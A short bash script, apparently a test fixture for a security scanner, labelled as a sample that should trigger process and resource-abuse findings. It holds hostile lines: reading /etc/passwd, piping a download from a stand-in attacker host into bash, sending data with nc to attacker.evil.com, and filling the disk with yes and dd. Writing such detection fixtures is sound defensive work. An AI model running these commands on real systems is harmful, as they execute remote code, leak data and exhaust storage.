#!/bin/bash
# Sample 11: Bash pipeline and complex chains.
# Should trigger findings (process_system / resource_abuse).
cat /etc/passwd | grep root | awk '{print $1}' | sort | uniq -c | head
curl https://evil.example.com/exfil | bash
echo "data" | nc attacker.evil.com 4444 &
yes "fill disk" > /tmp/bigfile &
dd if=/dev/zero of=/tmp/zero bs=1M count=10000
